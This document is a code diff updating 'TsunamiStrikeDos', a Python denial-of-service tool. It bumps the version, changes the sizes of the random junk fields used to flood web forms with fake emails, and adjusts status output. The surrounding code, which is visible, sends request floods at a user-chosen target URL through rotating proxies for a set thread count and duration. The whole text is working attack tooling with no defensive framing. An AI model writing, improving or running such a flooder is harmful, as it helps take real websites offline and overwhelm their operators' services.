@@ -25,7 +25,7 @@ print(f'''
 ⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-                {F.CYAN} TsunamiStrikeDos {F.GREEN}V 3.1 {F.RESET}
+                {F.CYAN} TsunamiStrikeDos {F.GREEN}V 3.2.1 {F.RESET}
 ''')
 
 # -------------------------------------------
@@ -44,8 +44,8 @@ def emailCreateFake():
 
 def dataRandom():
     return {
-        'name': ''.join(random.choices(string.ascii_letters, k=7000)),
-        'message2': ''.join(random.choices(string.ascii_letters + string.digits + "~!@#$%^&*()", k=7000)),
+        'name': ''.join(random.choices(string.ascii_letters, k=700)),
+        'message': ''.join(random.choices(string.ascii_letters + string.digits + "~!@#$%^&*()", k=7000)),
         'email': emailCreateFake()
     }
 
@@ -109,10 +109,10 @@ def flood(target: str) -> None:
         except (Timeout, OSError):
             continue
         else:
-            status = f"{F.GREEN if response.status_code == 200 else F.RED}{response.status_code}{F.RESET}"
+            status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
             payload_size = f"{F.GREEN} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
             proxy_addr = f"| {F.GREEN}Proxy: {F.CYAN}{proxy['http']:>21}"
-            print(f"({status}) Request Sent!{F.RESET} --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
+            print(f"{status} Request Sent!{F.RESET} --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
             if response.status_code != 200:
                 try:
                     proxies.remove(proxy)
@@ -138,3 +138,4 @@ if __name__ == "__main__":
     duration = int(input(f"{F.CYAN}[?]{F.RESET} attack duration (seconds): {F.GREEN}"))
 
     start_flooding(target_url, num_threads, duration)
+    
